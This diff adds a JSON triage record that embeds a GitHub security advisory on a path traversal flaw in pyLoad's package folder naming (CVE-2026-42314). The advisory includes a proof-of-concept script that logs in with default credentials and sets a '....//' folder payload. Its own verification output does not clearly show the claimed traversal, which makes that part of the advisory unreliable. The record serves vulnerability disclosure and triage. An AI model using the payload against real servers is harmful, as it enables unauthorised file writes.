@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/191794587?v=4\", \"events_url\": \"https://api.github.com/users/l3tchupkt/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/l3tchupkt/followers\", \"following_url\": \"https://api.github.com/users/l3tchupkt/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/l3tchupkt/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/l3tchupkt\", \"id\": 191794587, \"login\": \"l3tchupkt\", \"node_id\": \"U_kgDOC26Nmw\", \"organizations_url\": \"https://api.github.com/users/l3tchupkt/orgs\", \"received_events_url\": \"https://api.github.com/users/l3tchupkt/received_events\", \"repos_url\": \"https://api.github.com/users/l3tchupkt/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/l3tchupkt/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/l3tchupkt/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/l3tchupkt\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-42314\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-22\", \"name\": \"Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')\"}], \"description\": \"Insufficient sanitization of package folder names allows writing files outside the intended download directory.\\n\\n## Affected Component\\n- `src/pyload/core/api/__init__.py`\\n- Function: `add_package()`\\n\\n## Description\\nPackage folder names are sanitized using insufficient string replacement:\\n\\n```python\\nfolder = (\\n    folder.replace(\\\"http://\\\", \\\"\\\")\\n    .replace(\\\"https://\\\", \\\"\\\")\\n    .replace(\\\"../\\\", \\\"_\\\")  # Bypassable!\\n    .replace(\\\"..\\\\\\\\\\\", \\\"_\\\")\\n    .replace(\\\":\\\", \\\"\\\")\\n    .replace(\\\"/\\\", \\\"_\\\")\\n    .replace(\\\"\\\\\\\\\\\", \\\"_\\\")\\n)\\n```\\n\\nThe `../` replacement is bypassable. The pattern `....//` becomes `.._` after replacement (partial removal), leaving `..` which can be exploited when the path is later resolved by the OS.\\n\\n## Proof of Concept\\n\\n### Setup\\n```bash\\npip install pyload-ng[all]\\npyload -d &\\n# Default credentials: pyload / pyload\\n```\\n\\n### Exploit\\n```python\\n#!/usr/bin/env python3\\nimport requests\\n\\nBASE_URL = \\\"http://localhost:8000\\\"\\nUSERNAME = \\\"pyload\\\"\\nPASSWORD = \\\"pyload\\\"\\n\\nsession = requests.Session()\\n\\n# Login\\nsession.post(f\\\"{BASE_URL}/login\\\", data={\\n    \\\"username\\\": USERNAME,\\n    \\\"password\\\": PASSWORD\\n})\\n\\n# Create package with malicious folder name\\n# The pattern ....// bypasses the ../ replacement\\n# After sanitization: .._ (still contains ..)\\nfolder_payload = \\\"....//....//....//tmp/evil\\\"\\n\\nresp = session.post(f\\\"{BASE_URL}/api/add_package\\\", json={\\n    \\\"name\\\": \\\"test_package\\\",\\n    \\\"links\\\": [\\\"http://example.com/file.txt\\\"],\\n    \\\"dest\\\": 1  # Destination.QUEUE\\n})\\n\\npackage_id = resp.json()\\nprint(f\\\"Created package: {package_id}\\\")\\n\\n# Set malicious folder name\\nresp = session.post(f\\\"{BASE_URL}/api/set_package_data\\\", json={\\n    \\\"package_id\\\": package_id,\\n    \\\"data\\\": {\\\"folder\\\": folder_payload}\\n})\\n\\nprint(f\\\"Set folder payload: {folder_payload}\\\")\\nprint(f\\\"Response: {resp.status_code}\\\")\\n\\n# When download occurs, files will be written outside download dir\\nprint(\\\"[+] When a file is downloaded, it will be written to manipulated path\\\")\\nprint(\\\"    The sanitized folder still contains '..' sequences that OS resolves\\\")\\n```\\n\\n### Verification\\nCheck where files would be written:\\n```python\\nimport os\\n\\ndownload_dir = \\\"/home/user/Downloads\\\"\\nfolder = \\\"....//....//....//tmp/evil\\\"\\n\\n# Simulate pyLoad's sanitization\\nsanitized = folder.replace(\\\"../\\\", \\\"_\\\").replace(\\\"/\\\", \\\"_\\\")\\nprint(f\\\"After pyLoad sanitization: {sanitized}\\\")\\n# Output: .._.._.._tmp_evil\\n\\n# When pyLoad does os.path.join and then opens the file:\\nfinal_path = os.path.join(download_dir, sanitized)\\nprint(f\\\"Joined path: {final_path}\\\")\\n# Output: /home/user/Downloads/.._.._.._tmp_evil\\n\\n# The .. sequences remain and could be resolved by OS during file operations\\n```\\n\\n## Impact\\nAuthenticated users with ADD permission can:\\n- Write files outside the download directory\\n- Potentially overwrite system files (depending on permissions)\\n- Clutter system directories with downloaded content\", \"epss\": {\"percentage\": 0.00342, \"percentile\": 0.25873}, \"ghsa_id\": \"GHSA-97r3-5w84-r4q8\", \"github_reviewed_at\": \"2026-05-05T21:13:08Z\", \"html_url\": \"https://github.com/advisories/GHSA-97r3-5w84-r4q8\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-97r3-5w84-r4q8\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-42314\"}], \"nvd_published_at\": \"2026-05-11T18:16:35Z\", \"published_at\": \"2026-05-05T21:13:08Z\", \"references\": [\"https://github.com/pyload/pyload/security/advisories/GHSA-97r3-5w84-r4q8\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-42314\", \"https://github.com/pypa/advisory-database/tree/main/vulns/pyload-ng/PYSEC-2026-128.yaml\", \"https://github.com/advisories/GHSA-97r3-5w84-r4q8\"], \"repository_advisory_url\": \"https://api.github.com/repos/pyload/pyload/security-advisories/GHSA-97r3-5w84-r4q8\", \"severity\": \"medium\", \"source_code_location\": \"https://github.com/pyload/pyload\", \"summary\": \"PyLoad Vulnerable to Path Traversal via Package Folder Name\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-08T19:48:33Z\", \"url\": \"https://api.github.com/advisories/GHSA-97r3-5w84-r4q8\", \"vulnerabilities\": [{\"first_patched_version\": \"0.5.0b3.dev100\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"pyload-ng\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 0.5.0b3.dev79\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-97r3-5w84-r4q8",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "pyload-ng: <= 0.5.0b3.dev79"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-42314"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "pyload-ng"
+    ],
+    "remote": true,
+    "vendor_severity": "medium"
+  },
+  "first_seen_at": "2026-07-20T19:52:00.387890Z",
+  "provenance": {
+    "content_sha256": "c1e666da0c5980b848cca3ddce9c2d8c34309eec17f2bd9b983774c571d94e03",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-05T21:13:08Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-97r3-5w84-r4q8",
+  "status": "active",
+  "title": "PyLoad Vulnerable to Path Traversal via Package Folder Name",
+  "updated_at": "2026-06-08T19:48:33Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-97r3-5w84-r4q8"
+}
